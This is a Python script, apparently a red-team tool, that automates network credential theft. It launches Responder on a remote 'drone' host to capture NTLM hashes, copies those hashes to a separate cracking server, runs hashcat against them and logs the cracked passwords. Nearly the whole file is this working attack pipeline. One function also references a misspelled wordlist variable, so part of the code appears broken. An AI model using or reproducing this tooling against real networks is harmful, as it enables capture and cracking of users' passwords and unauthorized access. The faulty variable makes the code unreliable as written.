#!/usr/bin/env python

from scp import SCPClient
import netifaces
import string
import multiprocessing
import random
import paramiko
import getpass
import re
import time
import os
import signal
import argparse
import sys
import subprocess

class c:
    BLU = '\033[94m'
    GRN = '\033[92m'
    TAN = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'

def parse_args():
	#Create the arguments
    parser = argparse.ArgumentParser()
    parser.add_argument("-d", "--droneip", help="Enter the drone IP. If setting this, must also set -l arg.")
    parser.add_argument("-l", "--localip", help="Enter the local VPN IP. If setting this, must also set -d arg.")
    parser.add_argument("-c", "--crackerip", help="Enter the crackbox IP.")
    parser.add_argument("-w", "--wordlist-path", help="Enter the wordlist path on the cracking box")
    parser.add_argument("-x", "--hashcat-path", help="Enter the hashcat path on the cracking box")
    parser.add_argument("-r", "--rule-path", help="Enter the hashcat rule path on the cracking box")
    return parser.parse_args()

def get_dronevpn_ips(args):
    '''
    Get the drone vpn ip address
    '''
    if args.droneip and args.localip:
        droneip = args.droneip
        localip = args.localip
    else:
        for intf in netifaces.interfaces():
            for link in netifaces.ifaddresses(intf)[netifaces.AF_INET]:
                ip = link['addr']
                # Drone VPN subnets: 10.120.*.*
                if ip.startswith('10.120.'):
                    localip = ip
                    localip_split = localip.split('.')
                    droneip = '.'.join(localip_split[:3])+'.4'

    return localip, droneip

def run_drone_cmd(d_ssh, cmd):
    print '[*] Running on drone: {}'.format(cmd)
    stdin, stdout, stderr = d_ssh.exec_command(cmd)
    return (stdin, stdout, stderr)

def check_for_resp(d_ssh):
    cmd = 'cd /opt/Responder'
    stdin, stdout, stderr = run_drone_cmd(d_ssh, cmd)
    cd_err = str(stderr.readlines())
    if 'No such file or directory' in cd_err:
        cmd = 'cd /opt/ && git clone https://github.com/SpiderLabs/Responder'
        stdin, stdout, stderr = run_drone_cmd(d_ssh, cmd)
    else:
        cmd = 'cd /opt/Responder && git pull'
        stdin, stdout, stderr = run_drone_cmd(d_ssh, cmd)

def launch_responder(droneip, d_ssh):
    '''
    Launches Responder on the drone in a screen session
    '''
    # Open Responder in a screen session
    cmd = 'screen -S responder -dm python /opt/Responder/Responder.py -I eth0 -wf'
    stdin, stdout, stderr = d_ssh.exec_command(cmd)
    return (stdin, stdout, stderr)

def get_cracker_creds():
    '''
    Asks the user for crackerbox login and password
    '''
    user = raw_input('[*] LDAP username for crackerbox: ')
    pw = getpass.getpass()
    return user, pw

def get_drone_creds():
    '''
    Asks user for the drone ssh login name and password
    '''
    user = raw_input('[*] Drone ssh login name: ')
    pw = getpass.getpass()
    return user, pw

def parse_resp_output(d_ssh):
    '''
    Cycles through /opt/Responder/logs/ to collect hash files and returns all it sees
    '''
    remote_hash_files = []
    stdin, stdout, stderr = d_ssh.exec_command('ls /opt/Responder/logs')
    out = stdout.readlines()
    for x in out:
        x = x.strip()
        if 'NTLMv' in x:
            remote_hash_files.append(x)

    return remote_hash_files

def ssh_client(server, port, user, pw):
    '''
    Creates the SSH client using paramiko
    '''
    client = paramiko.SSHClient()
    client.load_system_host_keys()
    # Auto add host keys to known_keys
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        client.connect(server, port, user, pw)
    except paramiko.AuthenticationException:
        sys.exit('[-] Authentication failed')
    return client

def make_hashcat_cmd(hash_file, wordlist_path, hashcat_path, rule_path):
    '''
    Creates the hashcat cmd to be run on the crackerbox
    '''
    ran_str = ''.join(random.choice(string.letters) for x in range(5))
    identifier = 'autoresp-'+ran_str
    hashcat  = '{} --session {}'.format(hashcat_path, identifier)
    hashcat += ' -m {} '
    hashcat += '-o {} /tmp/{} {} -r {}'.format(identifier, hash_file, wordlist_path, rule_path)
    if 'NTLMv1' in hash_file:
        hashcat = hashcat.format('5500')
        screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
    elif 'NTLMv2' in hash_file:
        hashcat = hashcat.format('5600')
        screen = 'screen -S {} -dm {}'.format(identifier, hashcat)
    else:
        return None, None

    print '[+] Running on crackerbox:'
    print '    {}'.format(screen)
    return screen, identifier

def launch_cracking(d_scp, c_scp, c_user, c_ssh, unsent, worlist_path, hashcat_path, rule_path):
    '''
    Grab hashes off drone then put them on the crackerbox
    '''
    sent_hashes = []
    for u in unsent:
        print c.TAN+'[+] New hash found! Downloading locally: {}'.format(u)+c.END
        # scp the files from the drone to the local machine
        #          remote path              local path
        d_scp.get('/opt/Responder/logs/'+u, os.getcwd()+'/'+u)
        # scp the hashes from the local machine to the crackerbox
        #         local path          remote path
        c_scp.put(os.getcwd()+'/'+u, '/tmp/'+u)
        hashcat_cmd, identifier = make_hashcat_cmd(u, wordlist_path, hashcat_path, rule_path)

        # Just in case hashcat_cmd is none we still want to say we sent the hash over
        # so the script doesn't continually think we haven't seen that file before
        if hashcat_cmd:
            # Execute the screen session on crackerbox
            stdin, stdout, stderr = c_ssh.exec_command(hashcat_cmd)
        sent_hashes.append((identifier, u))

    return sent_hashes

def find_cracked_hashes(c_ssh, sent_hashes, cracked):
    '''
    Check .pot files on crackerbox for cracked hashes
    '''
    for i,h in sent_hashes:
        if (i,h) not in cracked:
            stdin, stdout, stderr = c_ssh.exec_command('cat {}.pot'.format(i))
            out = stdout.read().strip()
            if out != '':
                print c.TAN + '[+] Cracked!\n    '+ out + c.END
                with open('cracked.txt', 'a') as f:
                    f.write(out+'\n')
                cracked.append((i,h))
    return cracked

def main(args):

    # Root check
    if os.geteuid() != 0:
        sys.exit('[-] Run as root')
    if not args.crackerip:
        sys.exit('[-] Use: ./autoresp.py -c <cracking box IP address> -w <wordlist path> -r <rule path> -x <hashcat bin path>')

    hash_files = []
    sent_hashes = []
    cracked = []
    ctrlc = False
    hashcat_path = args.hashcat_path
    wordlist_path = args.wordlist_path
    rule_path = args.rule_path

    raw_input('[*] Hit [Enter] when you are connected to both the jumpbox VPN and the cracking box network')
    localip, droneip = get_dronevpn_ips(args)
    print '[*] Local IP: {}'.format(localip)
    print '[*] Jumpbox IP: {}'.format(droneip)

    # Setup cracker scp
    c_user, c_pw = get_cracker_creds()
    c_ssh = ssh_client(args.crackerip, 22, c_user, c_pw)
    c_scp = SCPClient(c_ssh.get_transport())

    # Setup drone scp
    d_user, d_pw = get_drone_creds()
    d_ssh = ssh_client(droneip, 22, d_user, d_pw)
    d_scp = SCPClient(d_ssh.get_transport())

    check_for_resp(d_ssh)

    #Launch responder on drone, rspndr = (stdin, stdout, stderr)
    cmd = 'screen -S responder -dm python /opt/Responder/Responder.py -I eth0 -wf'
    stdin, stdout, sterr = run_drone_cmd(d_ssh, cmd)

    # Check for new hashes and send them off
    while 1:
        try:
            # Check if user has killed Responder or not
            if ctrlc == False:
                # Check for new hashes in remote /opt/Responder/logs dir
                remote_hash_files = parse_resp_output(d_ssh)
                for h in remote_hash_files:
                    if h not in hash_files:
                        hash_files.append(h)
                if len(sent_hashes) > 0:
                    # sent_hashes = [(identifier, hash)]
                    # zip(*sent_hashes)[1] is just list of hashes
                    unsent = [h for h in hash_files if h not in zip(*sent_hashes)[1]]
                else:
                    unsent = hash_files
                sent_hashes += launch_cracking(d_scp, c_scp, c_user, c_ssh, unsent, wordlist_path, hashcat_path, rule_path)

            cracked = find_cracked_hashes(c_ssh, sent_hashes, cracked)
            time.sleep(1)

        except KeyboardInterrupt:
            if ctrlc == False:
                ctrlc = True
                print '[*] Killing drone Responder session. Hit CTRL+C again to end script.'
                d_ssh.exec_command("ps aux | grep -i 'screen -s responder' | grep -v grep | awk '{print $2}' | xargs kill")
                d_ssh.exec_command("screen -wipe")
                continue
            else:
                sys.exit('[-] Goodbye. Any active hashcat sessions will continue running.')

main(parse_args())
